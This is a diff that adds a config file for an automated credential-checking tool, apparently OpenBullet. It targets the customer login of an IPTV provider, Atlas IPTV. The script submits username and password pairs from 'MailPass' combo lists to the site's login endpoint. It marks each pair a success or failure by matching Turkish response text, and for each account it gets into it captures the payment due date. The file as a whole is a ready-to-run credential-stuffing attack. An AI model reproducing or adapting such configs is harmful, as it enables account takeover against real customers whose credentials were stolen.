@@ -1,0 +1,47 @@
+[SETTINGS]
+{
+  "Name": "Atlas İPTV",
+  "SuggestedBots": 1,
+  "LastModified": "2019-05-18T15:10:33.6529907+03:00",
+  "AdditionalInfo": "",
+  "Author": "Rez88",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Giriş REQUEST POST "https://musteri.atlasiptv.biz/dologin.php" 
+  CONTENT "token=0a4ba8a5012db0c882dfd4ecf57d90c26bf3afd8&username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+#Keyler KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Girmiş olduğunuz e-posta adresi veya şifre hatalı. Lütfen tekrar deneyiniz. " 
+    KEY "Girmiş olduğunuz e-posta adresi veya " 
+    KEY "işareti ekleyin." 
+  KEYCHAIN Success OR 
+    KEY "Çıkış" 
+    KEY "Tekrar Hoşgeldiniz," 
+#Capture_Url REQUEST GET "https://musteri.atlasiptv.biz/clientarea.php?action=productdetails" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+#Son_Ödeme_Tarihi PARSE "<SOURCE>" LR "<td class=\"text-center\"><span class=\"hidden\">" "</span>" -> CAP "Son Ödeme Tarihi" 
